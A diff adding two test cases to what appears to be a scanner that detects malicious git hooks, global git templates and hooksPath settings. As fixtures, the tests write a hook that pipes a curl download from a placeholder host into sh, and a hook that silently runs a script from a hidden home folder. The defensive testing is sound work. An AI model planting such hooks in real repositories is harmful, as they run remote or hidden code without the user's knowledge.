@@ -158,3 +158,27 @@ yara_rules(){
   mod 16
   grep -q "Git setting that can run commands (verify): $UH/.gitconfig:" "$RUN/.flags.raw"
 }
+
+@test "16 flags hooks from a global git template folder and a global hooksPath" {
+  mkdir -p "$UH/.tpl/hooks" "$UH/.ghooks" "$UH/.git-templates/hooks"
+  printf '[init]\n\ttemplateDir = ~/.tpl\n[core]\n\thooksPath = "%s"\n' "$UH/.ghooks" > "$UH/.gitconfig"
+  printf '#!/bin/sh\nexit 0\n' > "$UH/.tpl/hooks/pre-commit"
+  printf '#!/bin/sh\n%s -s https://x.invalid/a | sh\n' "cu""rl" > "$UH/.ghooks/pre-push"
+  printf '#!/bin/sh\nexit 0\n' > "$UH/.git-templates/hooks/post-checkout"
+  printf 'sample\n' > "$UH/.tpl/hooks/pre-commit.sample"
+  mod 16
+  grep -qxF "[16] Git template adds a hook to every new repository (verify): $UH/.tpl/hooks/pre-commit" "$RUN/.flags.raw"
+  grep -qxF "[16] Git template adds a hook to every new repository (verify): $UH/.git-templates/hooks/post-checkout" "$RUN/.flags.raw"
+  grep -qxF "[16] Git hook downloads or runs hidden code: $UH/.ghooks/pre-push" "$RUN/.flags.raw"
+  grep -qF "Git setting that can run commands (verify): $UH/.gitconfig:	templateDir = ~/.tpl" "$RUN/.flags.raw"
+  not grep -q "pre-commit.sample" "$RUN/.flags.raw"
+}
+
+@test "17 flags a repository hook that runs a script from a hidden home folder, not a plain hook" {
+  mkdir -p "$UH/proj/.git/hooks" "$UH/ok/.git/hooks"
+  printf '#!/bin/sh\n%s "$HOME/.node-cache/index.js" &\n' "no""de" > "$UH/proj/.git/hooks/pre-commit"
+  printf '#!/bin/sh\nnpx lint-staged\n' > "$UH/ok/.git/hooks/pre-commit"
+  mod 17
+  grep -qxF "[17] Git hook downloads or runs hidden code: $UH/proj/.git/hooks/pre-commit" "$RUN/.flags.raw"
+  not grep -q "$UH/ok/" "$RUN/.flags.raw"
+}
